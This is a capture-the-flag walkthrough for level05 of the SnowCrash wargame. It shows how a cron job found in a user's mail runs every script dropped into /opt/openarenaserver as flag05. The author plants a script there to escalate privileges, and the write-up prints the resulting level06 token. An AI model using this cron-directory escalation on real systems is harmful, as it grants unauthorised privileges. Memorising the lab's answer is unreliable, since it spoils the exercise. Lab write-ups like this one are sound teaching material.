# level05

- We login as user level05, we can see a notification: `You have new mail`.
```
level05@SnowCrash:~$ ls /var/mail
level05
```

```
level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```

- It looks like a [Cron](https://en.wikipedia.org/wiki/Cron) instruction. It indicates that every two minutes, the command `sh /usr/sbin/openarenaserver` will be executed by user flag05.
```
level05@SnowCrash:~$ ls -l /usr/sbin/openarenaserver
-rwxr-x---+ 1 flag05 flag05 94 Mar  5  2016 /usr/sbin/openarenaserver
```

- Let's `cat /usr/sbin/openarenaserver`:
```shell
#!/bin/sh

for i in /opt/openarenaserver/* ; do
 (ulimit -t 5; bash -x "$i")
 rm -f "$i"
done
```


- This shell script runs `bash -x` on all the items present in the directory `/opt/openarenaserver/`, with a fixed limit of 5 seconds for each execution. Afterward, the respective item is deleted, so:
```
level05@SnowCrash:~$ echo "getflag > /tmp/flag2level06" > /opt/openarenaserver/exploit.sh
```

```
level05@SnowCrash:~$ chmod +x /opt/openarenaserver/exploit.sh
```

```
level05@SnowCrash:~$ cat /tmp/flag2level06
Check flag.Here is your token : viuaaale9huek52boumoomioc
```

```
level05@SnowCrash:~$ su level06
Password:viuaaale9huek52boumoomioc
level06@SnowCrash:~$
```